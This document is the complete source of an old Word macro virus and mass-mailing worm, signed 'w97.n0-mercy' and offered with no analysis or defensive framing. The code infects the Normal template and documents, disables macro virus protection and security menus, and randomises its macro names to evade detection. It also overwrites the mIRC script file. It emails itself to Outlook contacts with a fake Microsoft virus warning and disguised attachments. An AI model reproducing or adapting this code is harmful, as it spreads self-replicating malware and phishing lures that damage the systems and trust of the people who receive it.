
Sub main()
'w97.n0-mercy
'coded by a.v_killer
On Error Resume Next
n$ = DefaultDir$(2) + "\NORMAL.DOT"
F$ = FileName$()
If GetAttr(n$) < 32 Then GoTo del
a = CountMacros(0)
If a > 0 Then
    For b = 1 To a
        If MacroName$(b, 0) = "FileSave" Then c = 1
    Next b
End If

If c <> 1 Then
Organizer .Copy, .Source = F$, .Destination = n$, .Name = "AutoOpen", .Tab = 3
Organizer .Copy, .Source = F$, .Destination = n$, .Name = "FileSave", .Tab = 3

End If

aa = CountMacros(1)
If aa > 0 Then
    For bb = 1 To aa
        If MacroName$(bb, 1) = "FileSave" Then CC = 1
    Next bb
End If

If CC <> 1 Then
    FileSaveAs .Format = 1
    fm$ = FileName$() + ":AutoOpen"
    MacroCopy "AutoOpen", fm$
    fm$ = FileName$() + ":FileSave"
    MacroCopy "FileSave", fm$

End If
End Sub

Private Sub Stealth()
On Error Resume Next
Application.DisplayAlerts = False
Application.DisplayStatusBar = False
Application.EnableCancelKey = False
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("tools").Controls("Templates and Add-Ins...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("Format").Controls("Style...").Enabled = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
End Sub

Sub VBPE()
On Error GoTo Done
 
a$ = FileName$()
If a$ = "" Then GoTo finish
 
If VInstalled = 0 Then
        Run1
        Run2
        FileSaveAll 1, 1
Else
        GoTo Done
End If
 
Done:
a$ = FileName$()
If a$ = "" Then
        GoTo finish
Else
        Insert " "
End If
 
finish:
MsgBox "polymorph", -8
End Sub
 
Sub Run1()
x$ = Fun$(F$, G$, H$, J$)
y$ = Fun$(F$, G$, H$, J$)
 
Z$ = x$ + y$
 
R1$ = GetDocumentVar$("VirNameDoc")
CO$ = FileName$() + ":" + R1$
MacroCopy CO$, "Global:" + Z$
SetProfileString "Intl", "Info2", Z$
ToolsCustomizeKeyboard .KeyCode = 65, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub
 
Sub Run2()
x$ = Fun$(F$, G$, H$, J$)
y$ = Fun$(F$, G$, H$, J$)
 
Z$ = x$ + y$
 
R2$ = GetDocumentVar$("VirName")
OC$ = FileName$() + ":" + R2$
MacroCopy OC$, "Global:" + Z$
SetProfileString "Intl", "Info1", Z$
ToolsCustomizeKeyboard .KeyCode = 32, .Category = 2, .Name = Z$, .Add, .Context = 0
End Sub
 
Function VInstalled()
CC$ = GetProfileString$("Intl", "Info1")
        VInstalled = 0
        If CountMacros(0) > 0 Then
                For I = 1 To CountMacros(0)
                If MacroName$(I, 0) = CC$ Then
                        VInstalled = 1
                End If
        Next I
End If
End Function
 
Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
num = Int(Rnd() * (Two - One) + One)
a$ = Str$(num)
a$ = LTrim$(a$)
 
b$ = Mid$(a$, 1, 1)
c$ = Mid$(a$, 2, 1)
d$ = Mid$(a$, 3, 1)
e$ = Mid$(a$, 4, 1)
 
If b$ = "1" Then F$ = "A"
If b$ = "2" Then F$ = "B"
If b$ = "3" Then F$ = "C"
If b$ = "4" Then F$ = "D"
If b$ = "5" Then F$ = "E"
If b$ = "6" Then F$ = "F"
If b$ = "7" Then F$ = "G"
If b$ = "8" Then F$ = "H"
If b$ = "9" Then F$ = "I"
If b$ = "0" Then F$ = "J"
 
If c$ = "1" Then G$ = "H"
If c$ = "2" Then G$ = "I"
If c$ = "3" Then G$ = "J"
If c$ = "4" Then G$ = "K"
If c$ = "5" Then G$ = "L"
If c$ = "6" Then G$ = "M"
If c$ = "7" Then G$ = "N"
If c$ = "8" Then G$ = "O"
If c$ = "9" Then G$ = "P"
If c$ = "0" Then G$ = "Q"
 
If d$ = "1" Then H$ = "A"
If d$ = "2" Then H$ = "B"
If d$ = "3" Then H$ = "C"
If d$ = "4" Then H$ = "D"
If d$ = "5" Then H$ = "E"
If d$ = "6" Then H$ = "F"
If d$ = "7" Then H$ = "G"
If d$ = "8" Then H$ = "H"
If d$ = "9" Then H$ = "I"
If d$ = "0" Then H$ = "J"
 
If e$ = "1" Then J$ = "R"
If e$ = "2" Then J$ = "S"
If e$ = "3" Then J$ = "T"
If e$ = "4" Then J$ = "U"
If e$ = "5" Then J$ = "V"
If e$ = "6" Then J$ = "W"
If e$ = "7" Then J$ = "X"
If e$ = "8" Then J$ = "Y"
If e$ = "9" Then J$ = "Z"
If e$ = "0" Then J$ = "Q"
 
Fun$ = F$ + G$ + H$ + J$
End Function

Sub InfectMirc()
infe$ = "c:\mirc\script.ini"
Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists(infe$) Then GoTo mircwrite Else GoTo fling
mircwrite:
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[Script]"
Print #1, "n0;Miniscript"
Print #1, "n1= ON 1:JOIN:#:{ /exit } "
Print #1, "n2= ON 1:*xde*:#:{ /exit };"
Close #1
SetAttr "c:\mirc\script.ini", vbReadOnly
GoTo finish
fling:
MsgBox "Invalid Memory Space", vbCritical
finish:
End Sub

Sub main()
On Error Resume Next
Dim a, b, d, c, e, y, x, oo, ph, ph1, num, arrr, attch
ph = app.Path & "\" & app.exename & ".dll"
ph1 = app.Path & app.exename & ".dll"
For num = 0 To 3
arrr = Array("c:\a.v.dll", "c:\is.dll", "c:\killer.dll", "c:\no-mercy.dll")
attch = arrr(num)
FileCopy ph, attch
FileCopy ph1, attch
Next num
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 101 Then oo = d.AddressEntries.Count
Next oo
c.Subject = "microsoft says"
c.Body = "hi this is an important message from microsoft there is a virus installed in ur pc please download our attachment to prevent this virus"
c.attachments.Add "c:\a.v.dll", 1, 1, "reign on fire.mpg"
c.attachments.Add "c:\is.dll", 1, 2, "laugh.wav"
c.attachments.Add "c:\killer.dll", 1, 3, "choclat.jpg"
c.attachments.Add "c:\no-mercy.dll", 1, 4, "hotpasswords.txt"
c.Send
e = ""
Next y
b.Logoff
End If
End Sub